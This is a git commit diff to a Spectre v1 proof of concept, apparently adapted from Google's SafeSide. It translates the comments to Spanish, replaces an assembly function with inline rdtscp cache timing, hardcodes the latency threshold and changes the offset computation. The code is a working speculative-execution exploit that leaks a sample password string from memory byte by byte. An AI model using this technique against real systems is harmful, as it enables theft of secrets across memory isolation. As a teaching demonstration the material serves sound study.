1374f46750ff5674a7acc82601d9dc403d7da9be
senabi <sensenabi@gmail.com>
2021-08-08 13:39:00 -0500

    base

--- spectre_safeside.cc
+++ spectre_safeside.cc
@@ -1,7 +1,9 @@
 #include <algorithm>
 #include <cstddef>
+#include <cstdint>
 #include <cstdlib>
 #include <cstring>
+#include <emmintrin.h>
 #include <iostream>
 #include <limits>
 #include <memory>
@@ -9,12 +11,30 @@
 #include <x86intrin.h>
 
 using namespace std;
+uint64_t time1, time2;
+uint32_t junk;
+#define READ_LATENCY_THRESHOLD 80
 
 const char *public_data = "Hello, World";
 const char *private_data = "my password is 123adminABC";
 
+void ForceRead(const void *p) {
+  (void)*reinterpret_cast<const volatile char *>(p);
+}
+
 // Funcion para leer latencia, pero esta definida en assembly
-extern "C" uint64_t MeasureReadLatency(const void *address);
+// extern "C" uint64_t MeasureReadLatency(const void *address);
+// Funcion para leer latencia, pero esta definida en assembly
+uint64_t MeasureReadLatency(const void *address) {
+  _mm_mfence();
+  _mm_lfence();
+  time1 = __rdtscp(&junk);
+  _mm_lfence();
+  ForceRead(address);
+  _mm_lfence();
+  time2 = __rdtscp(&junk);
+  return time2 - time1;
+}
 
 inline void FlushDataCacheLineNoBarrier(const void *address) {
   _mm_clflush(address);
@@ -33,10 +53,6 @@ inline void FlushDataCacheLine(void *address) {
 
 constexpr size_t kCacheLineBytes = 64;
 constexpr size_t kPageBytes = 4 * 1024;
-
-void ForceRead(const void *p) {
-  (void)*reinterpret_cast<const volatile char *>(p);
-}
 
 class TimingArray {
 public:
@@ -62,106 +78,85 @@ public:
     //
     // No es importante el valor que escribamos siempre que forcemos escribir
     // algo en cada elemento. De lo contrario, la asignación de respaldo podría
-    // ser un rango de páginas de zero-fill-on-demand(ZFOD), de copy-on-writre
+    // ser un rango de páginas de zero-fill-on-demand(ZFOD), de copy-on-write
     // que todas comienzan mapeadas a la misma página física de ceros. Dado que
     // la caché en las CPUs modernas de Intel está etiquetada físicamente,
     // algunos elementos podrían asignarse a la misma línea de caché y no
     // observaríamos una diferencia de tiempo entre la lectura de elementos
     // accedidos y no accedidos.
-    //
-    // [EN]:
-    // It's not important what value we write as long as we force *something* to
-    // be written to each element. Otherwise, the backing allocation could be a
-    // range of zero-fill-on-demand (ZFOD), copy-on-write pages that all start
-    // off mapped to the same physical page of zeros. Since the cache on modern
-    // Intel CPUs is physically tagged, some elements might map to the same
-    // cache line and we wouldn't observe a timing difference between reading
-    // accessed and unaccessed elements.
     for (int i = 0; i < size(); ++i) {
       ElementAt(i) = -1;
     }
 
-    // Init the first time through, then keep for later instances.
-    static uint64_t threshold = FindCachedReadLatencyThreshold();
-    cached_read_latency_threshold_ = threshold;
+    // Inicializar el threshold la primera ves, luego lo guardamos para las
+    // siguientes instancias
+    // static uint64_t threshold = FindCachedReadLatencyThreshold();
+    // cached_read_latency_threshold_ = threshold;
+    cached_read_latency_threshold_ = READ_LATENCY_THRESHOLD;
   }
 
   TimingArray(TimingArray &) = delete;
   TimingArray &operator=(TimingArray &) = delete;
 
   ValueType &operator[](size_t i) {
-    // Map index to element.
+    // Mapear indice a elemento.
     //
-    // As mentioned in the class comment, we try to frustrate hardware
-    // prefetchers by applying a permutation so elements don't appear in
-    // memory in index order. We do this by using a Linear Congruential
-    // Generator (LCG) where the size of the array is the modulus.
-    // To guarantee that this is a permutation, we just need to follow the
-    // requirements here:
+    // Como se menciona en el comentario en la clase, nosotros tratamos de
+    // frustrar el prefetch por hardware aplicacando de una permutacion para que
+    // los elementos no aparecen en memoria en el orden del indice. Lo hacemos
+    // mediante el uso de un Linear Congruential Generator (LCG). Donde el
+    // tamaño del array es el modulo.
+    // Para garantizar que esto sea una permutacion, tenemos que seguir los
+    // requisitos descritos en:
     //
     // https://en.wikipedia.org/wiki/Linear_congruential_generator#c_%E2%89%A0_0
     //
-    // In this case, 113 makes a good choice: 113 is prime, 113-1 = 112 is
-    // divisible by 256's only prime factor (2), both are divisible by 4.
-    // If the array were dynamically sized, we would not be able to hardcode
-    // 113, and it would be difficult to produce a good multiplier.
-    // It may be desirable, instead, to switch to a different PRNG
-    // that also supports small periods and efficient seeking.
-    // (For example, a Permuted Congruential Generator.)
+    // En este caso, 113 es una buena opcion:
+    // 113 es primo.
+    // 113-1 es divisible por el unico factor primo de 256, (2).
+    // Ambos son divisibles por 4.
+    // Si el array tuviera un tamaño dinámico, no podríamos codificar 113, y
+    // sería difícil producir un buen multiplicador. Puede ser deseable, en
+    // cambio, cambiar a un PRNG diferente que también soporte períodos pequeños
+    // y una búsqueda eficiente. (Por ejemplo, un generador congruente
+    // permutado).
+    //
     static_assert(kRealElements == 256, "consider changing 113");
     size_t el = (100 + i * 113) % kRealElements;
 
-    // Add 1 to skip leading buffer element.
+    // Añadir 1 para omitir el primer elemento del buffer.
     return elements_[1 + el].cache_lines[0].value;
   }
 
-  // We intentionally omit the "const" accessor:
-  //    const ValueType& operator[](size_t i) const { ... }
-  //
-  // At the level of abstraction we care about, accessing an element at all
-  // (even to read it) is not "morally const" since it mutates cache state.
-
   size_t size() const { return kRealElements; }
 
-  // Flushes all elements of the array from the cache.
+  // Borra todos los elementos del array de la cache.
   void FlushFromCache() {
     // We only need to flush the cache lines with elements on them.
     for (int i = 0; i < size(); ++i) {
       FlushDataCacheLineNoBarrier(&ElementAt(i));
     }
 
-    // Wait for flushes to finish.
+    // Esperar a que termine la operacion flush
     MemoryAndSpeculationBarrier();
   }
 
-  // Reads elements of the array in index order, starting with index 0, and
-  // looks for the first read that was fast enough to have come from the cache.
+  // Devuelve el índice del primer elemento "rápido" despues de 'start_after', o
+  // -1 si ningún elemento fue obviamente leído desde la caché.
   //
-  // Returns the index of the first "fast" element, or -1 if no element was
-  // obviously read from the cache.
-  //
-  // This function uses a heuristic that errs on the side of false *negatives*,
-  // so it is common to use it in a loop. Of course, measuring the time it
-  // takes to read an element has the side effect of bringing that element into
-  // the cache, so the loop must include a cache flush and re-attempt the
-  // side-channel leak.
-  int FindFirstCachedElementIndex() {
-    // Start "after" the last element, which means start at the first.
-    return FindFirstCachedElementIndexAfter(size() - 1);
-  }
-
-  // Just like `FindFirstCachedElementIndex`, except it begins right *after*
-  // the index `start_after`, wrapping around to try all array elements. That
-  // is, the first element read is `(start_after+1) % size` and the last
-  // element read before returning -1 is `start_after`.
+  // Igual que `FindFirstCachedElementIndex`, excepto que comienza justo
+  // *después* del índice `start_after`, envolviendo para probar todos los
+  // elementos del array. Es decir, el primer elemento leído es `(start_after+1)
+  // % size` y el último elemento leído antes de devolver -1 es `start_after`.
   int FindFirstCachedElementIndexAfter(int start_after) {
-    // Fail if element is out of bounds.
+    // Falla si el elemento esta fuera de limites.
     if (start_after >= size()) {
       return -1;
     }
 
-    // Start at the element after `start_after`, wrapping around until we've
-    // found a cached element or tried every element.
+    // Comienza en el elemento después de `start_after`, recorremos hasta que
+    // hayamos encontrado un elemento en caché o hayamos probado todos los
+    // elementos.
     for (int i = 1; i <= size(); ++i) {
       int el = (start_after + i) % size();
       uint64_t read_latency = MeasureReadLatency(&ElementAt(el));
@@ -170,71 +165,68 @@ public:
       }
     }
 
-    // Didn't find a cached element.
+    // No se encontro un elemento cache.
     return -1;
   }
 
-  // Returns the threshold value used by FindFirstCachedElementIndex to
-  // identify reads that came from cache.
-  uint64_t cached_read_latency_threshold() const {
-    return cached_read_latency_threshold_;
-  }
-
 private:
-  // Convenience so we don't have (*this)[i] everywhere.
+  // Para no tener (*this)[i] en todas partes.
   ValueType &ElementAt(size_t i) { return (*this)[i]; }
 
   uint64_t cached_read_latency_threshold_;
-  uint64_t FindCachedReadLatencyThreshold() {
+  // uint64_t FindCachedReadLatencyThreshold() {
 
-    const int iterations = 1000;
-    const int percentile = 10;
+  // const int iterations = 1000;
+  // const int percentile = 10;
 
-    // Accumulates the highest read latency seen in each iteration.
-    vector<uint64_t> max_read_latencies;
+  //// Accumula la latencia mas alta vista en cada iteracion.
+  // vector<uint64_t> max_read_latencies;
 
-    for (int n = 0; n < iterations; ++n) {
-      // Bring all elements into cache.
-      for (int i = 0; i < size(); ++i) {
-        ForceRead(&ElementAt(i));
-      }
+  // for (int n = 0; n < iterations; ++n) {
+  //// Cargar todos los elementos a cache.
+  // for (int i = 0; i < size(); ++i) {
+  // ForceRead(&ElementAt(i));
+  //}
 
-      // Read each element and keep track of the slowest read.
-      uint64_t max_read_latency = numeric_limits<uint64_t>::min();
-      for (int i = 0; i < size(); ++i) {
-        max_read_latency =
-            max(max_read_latency, MeasureReadLatency(&ElementAt(i)));
-      }
+  //// Lee cada elemento y lleva cuenta sobre las lecturas mas lentas.
+  // uint64_t max_read_latency = numeric_limits<uint64_t>::min();
+  // for (int i = 0; i < size(); ++i) {
+  // max_read_latency =
+  // max(max_read_latency, MeasureReadLatency(&ElementAt(i)));
+  //}
 
-      max_read_latencies.push_back(max_read_latency);
-    }
+  // max_read_latencies.push_back(max_read_latency);
+  //}
 
-    // Find and return the `percentile` max read latency value.
-    sort(max_read_latencies.begin(), max_read_latencies.end());
-    int index = (percentile / 100.0) * (max_read_latencies.size() - 1);
-    return max_read_latencies[index];
-  }
+  //// Encuntra y retorna el valor del percentil con la mayor latencia leida
+  // sort(max_read_latencies.begin(), max_read_latencies.end());
+  // int index = (percentile / 100.0) * (max_read_latencies.size() - 1);
+  // return max_read_latencies[index];
+  //}
 
-  // Define a struct that occupies one full cache line. Some compilers may not
-  // support aligning at `kCacheLineBytes`, which is almost always greater than
-  // `sizeof(max_align_t)`. In those cases we'll get a compile error.
-  // See: https://timsong-cpp.github.io/cppwp/n3337/basic.align#9
+  // Define un struct que ocupa una linea de cache completa. Algunos
+  // compiladores pueden no soportar la alineación en `kCacheLineBytes`, que
+  // casi siempre es mayor que `sizeof(max_align_t)`. En esos casos obtendremos
+  // un error de compilación. Ver:
+  // https://timsong-cpp.github.io/cppwp/n3337/basic.align#9
   struct alignas(kCacheLineBytes) CacheLine {
     ValueType value;
   };
   static_assert(sizeof(CacheLine) == kCacheLineBytes, "");
 
-  // Define our "Element" struct, which takes up one page plus one cache line.
-  // When we allocate an array of these, we know that adjacent elements will
-  // start on different pages and in different cache sets.
+  // Definir struct "Element", que ocupa una página más una línea
+  // de caché. Cuando asignamos una array de estos, sabemos que los elementos
+  // adyacentes comenzarán en diferentes páginas y en diferentes conjuntos de
+  // caché.
   static const int kCacheLinesPerPage = kPageBytes / kCacheLineBytes;
   struct Element {
     array<CacheLine, kCacheLinesPerPage + 1> cache_lines;
   };
   static_assert(sizeof(Element) == kPageBytes + kCacheLineBytes, "");
 
-  // The actual backing store for the timing array, with buffer elements before
-  // and after to avoid interference from adjacent heap allocations.
+  // El almacén de respaldo real para la matriz de sincronización, con elementos
+  // de búfer antes y después para evitar la interferencia de las asignaciones
+  // adyacentes del montón.
   //
   // We use `vector` here instead of `array` to avoid problems where
   // `TimingArray` is put on the stack and the class is so large it skips past
@@ -279,7 +271,7 @@ static char LeakByte(const char *data, size_t offset) {
       // El computo del valor del local_offset es branchless
       // y es equivalente a:
       // size_t local_offoset = ((i+1) % 2048) ? safe_offset : offset;
-      // primer valor es 1 hasta 2047 y luego es 0
+      // primer valor es 1 hasta 2046 y luego en 2047 es 0
       // usa safe_offset 2047 veces y al final usa "offset"
       size_t local_offset =
           offset + (safe_offset - offset) * bool((i + 1) % 2048);
@@ -289,6 +281,7 @@ static char LeakByte(const char *data, size_t offset) {
       if (local_offset < *size_in_heap) {
         // esta ramificacion ha sido entrenada para que se tome durante
         // speculative execution, y es tomada en la itaracion 2048
+        // MemoryAndSpeculationBarrier();
         ForceRead(&timing_array[data[local_offset]]);
       }
     }
@@ -303,10 +296,15 @@ static char LeakByte(const char *data, size_t offset) {
 }
 
 int main() {
+  // const size_t private_offset = private_data - public_data;
+  const size_t private_offset = strlen(public_data) + 1;
+  cout << "\nprivate offset: " << private_offset << '\n';
+  cout << "public addr: " << (void *)public_data << '\n';
+  cout << "private addr: " << (void *)private_data << '\n';
   cout << "Leaking the string: ";
   cout.flush();
-  const size_t private_offset = private_data - public_data;
   for (size_t i = 0; i < strlen(private_data); ++i) {
+    // for (size_t i = 0; i < 1000; ++i) {
     cout << LeakByte(public_data, private_offset + i);
     cout.flush();
   }
